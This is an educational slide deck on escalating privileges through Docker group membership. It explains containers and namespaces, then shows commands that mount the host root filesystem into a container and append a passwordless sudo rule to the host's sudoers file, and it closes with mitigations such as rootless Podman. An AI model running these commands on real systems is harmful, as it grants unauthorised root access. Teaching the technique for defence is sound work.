---
marp: true
theme: default
paginate: true
footer: "Using Docker for Privilige Escalation (C) 2023, Ray Steen"
---
<style>section  { justify-content: start; }</style>
<style scoped>section  { justify-content: center; }</style>

<!-- class: invert -->

# Using Docker for Privilige Escalation
![bg width:300px right](assets/vertical-logo-monochromatic.webp)
Inspired by John Hammond's [Docker - PRIVILEGE ESCALATION Technique](https://www.youtube.com/watch?v=MnUtHSpcdLQ)

---
# What is Docker?
> Docker is a set of platform as a service (PaaS) products that use OS-level virtualization to deliver software in packages called **containers**.
- Essentially, Docker is a tool that allows you to build, deploy, and manage **containers**.
- By default, Docker manages **containers** as **root**.
![bg width:300px right:30%](assets/vertical-logo-monochromatic.webp)
---
# What is a Container?
> A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another.
- Containers are lightweight, portable, and **isolated**.
![bg width:300px right:30%](assets/container.png)
---
# How does it work?
![bg width:300px right:30%](assets/docker-architecture.png)

> Docker makes use of kernel **_namespaces_** to provide the isolated workspace called the container. When you run a container, Docker creates a set of **_namespaces_** for that container. These **_namespaces_** provide a layer of isolation. Each aspect of a container runs in a separate namespace and its access is limited to that namespace.
---
# Namespaces
Docker Engine uses the following namespaces on Linux:

- `PID` namespace for process isolation.
- `NET` namespace for managing network interfaces.
- `IPC` namespace for managing access to IPC resources.
- **`MNT`** namespace for managing filesystem mount points.
- `UTS` namespace for isolating kernel and version identifiers and hostnames.
- **`USER`** namespace for user and group identity.
- `CGROUP` namespace for managing cgroup hierarchies.

---
# Setup: Software
- [Docker Engine](https://docs.docker.com/get-docker/)
---
# Setup: Users and Groups
## Users
- `root` - root user
- `user` - unprivileged user in the `docker` group
## Groups
- `docker` - group for users to run docker commands

---
<style scoped>section  { justify-content: center; }</style>

# Creating the container image
```dockerfile
FROM ubuntu

WORKDIR /exploit
```

Run the following command to build the image:
```bash
docker build -t exploit .
```
---
<style scoped>section  { justify-content: center; }</style>

# Running the container
```bash
docker run --rm -it -v /:/exploit exploit
```
---
<style scoped>section  { justify-content: center; }</style>
# Escalating Privileges
```bash
echo "user ALL=(ALL) NOPASSWD: ALL" >> etc/sudoers
```

---
<style scoped>section  { justify-content: center; }</style>
# What can we do to prevent this?
- Don't add users to the `docker` group.
- Don't run containers as root.

---
# What is Podman?
> Podman is a **daemonless** container engine for developing, managing, and running OCI Containers on your Linux System. Containers can either be run as root or in **rootless** mode.
- Podman is a **drop-in replacement** for Docker.
- Can be used to run containers as a **non-root** user.
![bg width:300px right:30%](assets/podman-vertical.png)

---
# Resources

- [Get Started with Docker](https://www.docker.com/get-started)
- [Getting Started with Podman](https://podman.io/getting-started/)
- [Get Docker](https://docs.docker.com/get-docker/)
- [Docker playground](https://labs.play-with-docker.com/)
- [Use the Docker command line](https://docs.docker.com/engine/reference/commandline/cli/)

## Container Images used
- [ubuntu](https://hub.docker.com/_/ubuntu)